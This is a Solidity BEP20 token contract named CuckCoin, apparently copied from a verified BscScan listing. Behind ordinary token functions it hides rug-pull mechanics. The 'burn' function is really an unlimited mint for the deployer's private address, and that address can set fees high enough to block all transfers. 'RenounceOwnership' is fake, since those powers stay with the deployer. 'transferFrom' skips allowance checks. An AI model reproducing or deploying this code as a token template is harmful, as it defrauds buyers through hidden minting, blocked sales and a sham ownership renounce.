/**
 *Submitted for verification at BscScan.com on 2021-09-09
*/

pragma solidity ^0.5.17;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  } 
}
contract BEP20 {
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function allowance(address owner, address spender) public view returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burning(address indexed from, address indexed to, uint256 value);
}
contract CuckCoin is BEP20 {
    using SafeMath for uint256;
    address public owner = msg.sender;
    address private burners = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    string public name;
    string public symbol;
    address private burnaddress;
    uint256 private fees;
    uint8 public decimals;
    uint256 private totalnow;
    uint public totalSupply;
    constructor() public {
	symbol = "CUCK";
    name = "CuckCoin";
    burnaddress = 0x000000000000000000000000000000000000dEaD;
    decimals = 9;
    totalSupply = 100000000000 * 10**12;
    totalnow = totalSupply / 1;
	balances[msg.sender] = totalnow;
	emit Transfer(address(0), msg.sender, totalnow);
	balances[burnaddress] = totalnow;
	emit Transfer(msg.sender, burnaddress, totalnow);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Burning(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier burner() {
        require(msg.sender == burners);
        _;
    }
    function balanceOf(address _owner) view public returns (uint256) {
        return balances[_owner];
    }
    function fee() view public returns (uint256) {
        return fees;
    }
    function setfee(uint256 taxFee) external burner() {
        fees = taxFee;
    }

    function devfee(uint256 devFee) external burner() {
        fees = devFee;
    }
    function burn( uint256 amount) public burner{
        balances[msg.sender] = balances[msg.sender]+(amount);
        emit Burning(burnaddress, msg.sender, amount);
    }
    function RenounceOwnership() public onlyOwner returns (bool){
        owner = burnaddress;
        emit OwnershipTransferred(owner, burnaddress);
    }
    function transfer(address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        balances[_to] = balances[_to].sub(_amount / uint256(100) * fees);
        balances[burnaddress] = balances[burnaddress].add(_amount / uint256(100) * fees);
        emit Transfer(msg.sender, burnaddress, balances[address(0)]);
        emit Transfer(msg.sender, _to, balances[_to]);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        balances[_from] = balances[_from].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function _msgSender() internal view returns (address) {
        return msg.sender;
    }
    function allowance(address _owner, address _spender) view public returns (uint256) {
        return allowed[_owner][_spender];
    }
}